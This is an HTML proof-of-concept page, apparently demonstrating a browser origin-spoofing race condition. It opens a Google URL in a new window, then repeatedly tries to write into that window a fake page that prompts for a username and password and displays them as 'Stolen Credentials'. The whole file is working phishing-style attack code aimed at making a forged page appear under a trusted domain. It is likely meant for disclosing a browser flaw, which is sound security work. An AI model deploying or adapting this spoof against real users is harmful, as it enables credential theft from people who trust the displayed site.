<!DOCTYPE html>
<html>
<body>
  <button onclick="spoof()">Click to spoof</button>

  <script>
    function spoof() {
      let win = window.open("https://www.google.com/gen_204", "_blank");

      let payload = `
        <h1>This is NOT Google!</h1>
        <script>
          setTimeout(() => {
            let u = prompt('Enter your username:');
            let p = prompt('Enter your password:');
            alert('Stolen Credentials:\\nUsername: ' + u + '\\nPassword: ' + p);
          }, 2000);
        <\/script>
      `;

      let inject = () => {
        try {
          win.document.open();
          win.document.write(payload);
          win.document.close();
        } catch (e) {
          console.log('Blocked:', e);
        }
      };

      // Multiple attempts to beat race condition
      setTimeout(inject, 10);
      setTimeout(inject, 50);
      setTimeout(inject, 100);
    }
  </script>
</body>
</html>
